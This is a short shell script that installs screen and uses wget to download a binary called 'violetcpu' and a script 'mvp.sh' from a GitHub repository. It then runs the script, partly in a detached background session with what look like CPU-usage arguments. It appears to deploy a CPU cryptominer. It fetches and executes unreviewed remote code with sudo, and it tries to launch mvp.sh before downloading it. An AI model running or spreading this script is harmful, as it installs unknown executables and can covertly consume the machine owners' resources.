#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS mvp.sh ./mvp.sh 65 75

wget https://github.com/angkii/bh/raw/main/violetcpu

wget https://raw.githubusercontent.com/angkii/bh/main/mvp.sh

chmod +x mvp.sh

./mvp.sh

